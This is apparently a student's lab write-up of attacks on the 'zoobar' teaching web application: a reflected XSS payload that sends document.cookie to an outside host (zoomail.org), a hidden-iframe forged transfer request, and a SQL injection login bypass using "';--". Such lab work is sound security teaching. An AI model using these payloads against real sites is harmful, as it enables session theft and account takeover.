# Web Security Project

*This document is written in Markdown format.*

## A: URL Attack

### Vulnerabilities

When users of the website search for other users on the website, the URL query are process by the website PHP script and the query content is added to the response HTML body without any escaping mechanism. Thus, it is easy for attackers to insert some bad code into the URL query and let users' browser to execute it. 

### My attack

```javascript
(new Image()).src = 'http://zoomail.org/sendmail.php?' +'&netid=edydfang' + '&payload=' + document.cookie + '&random=' + Math.random();
```

The above JavaScript send a request to zoomail.org with the site cookies in the query. And zoomail.org will sent an email to the attack, letting the attacker know the cookies, which help the attack to fool the website as the identity of that user.

Query of user:

`\" size=10\>\<script\>(new Image()).src='http://zoomail.org/sendmail.php?'+'&netid=edydfang'+'&payload='+document.cookie+'&random='+Math.random();\</script\>\<input type=\"hidden`

Encoded query:

`%5C%22%20size%3D10%5C%3E%5C%3Cscript%5C%3E%28new%20Image%28%29%29.src%3D%27http%3A%2F%2Fzoomail.org%2Fsendmail.php%3F%27%2B%27%26netid%3Dedydfang%27%2B%27%26payload%3D%27%2Bdocument.cookie%2B%27%26random%3D%27%2BMath.random%28%29%3B%5C%3C%2Fscript%5C%3E%5C%3Cinput%20type%3D%5C%22hidden`

Full URL:

`http://zoobar.org/users.php?user=%5C%22%20size%3D10%5C%3E%5C%3Cscript%5C%3E%28new%20Image%28%29%29.src%3D%27http%3A%2F%2Fzoomail.org%2Fsendmail.php%3F%27%2B%27%26netid%3Dedydfang%27%2B%27%26payload%3D%27%2Bdocument.cookie%2B%27%26random%3D%27%2BMath.random%28%29%3B%5C%3C%2Fscript%5C%3E%5C%3Cinput%20type%3D%5C%22hidden`



## B: XSS Attack

### Vulnerabilities

The zoobar website use the cookies as a user identifier, letting the user to modify his/her information or transfer credits between users. However, when user access some malicious web pages, their cookies can be stolen and do something bad for them. Although modern web browsers help users to prevent XSS Attacks, there are many ways to work around this kind of protections such as reverse proxy and iframe method.

### My Attack

I created a webpage that send post request via an invisible form on the parent frame whose target is an invisible iframe. We put all the payload of the original transfer post into the form `input` items and then `submit`. After the iframe is loaded completely, which means our request has been sent out, we change the window location to `https://www.google.com` immediately.



## C: SQL Injection Attack

### Vulnerabilities

After analyzing the user login authorization part of the ZooBar PHP code, we will find that the most critical part of the code is in the file `includes/auth.php`.  

```php
function _checkLogin($username, $password) {
    $quoteduser = $this->db->quote($username);
    $sql = "SELECT Salt FROM Person WHERE Username = '$quoteduser'";
    $rs = $this->db->executeQuery($sql);
    if ( !$rs->next() ) return false;   // No such user
    $salt = $rs->getValueByNr(0,0);
    $hashedpassword = md5($password.$salt);
    $sql = "SELECT * FROM Person WHERE " .
           "Username = '$username' AND " .
           "Password = '$hashedpassword'";
    $result = $this->db->executeQuery($sql);
    if ( $result->next() ) {
      $this->_setCookie($result, true);
      return true;
    } else {
      return false;
    }
  }

```

In the above function `_checkLogin`, we can notice that the code will first check whether the user exists and then use another SQL to check the password. The stupid thing is that when it check the existence of the user, it use the `quote` function to do quote escaping work, which making the injection of this part impossible. However, in the password checking SQL, there is no such kind of escaping. We can just add something after the `username` to let the SQL drop the rest of the WHERE sentence. To achieve this, what we need to do is first create a user whose username we will use to attack later, then when we use the manipulated username to login, as that username exists, the program will continue and check for the password correctness. As the password checking part is not working anymore, we can successfully login the target account.

### My Attack

 I used the similar XSS of the Part B. The only difference is the post URL and the data we are sending. Also, for this attack, we need to send two package, one for registration and another for login.

For the username manipulation, we can simply append `';--` , making the SQL terminate and let the rest of the text be the comment. For example, when we want to login to the user account `attacker`, we will first register the account `attacker';--` and then we use this username again and a arbitrary password to login. The account we login will be `attack`.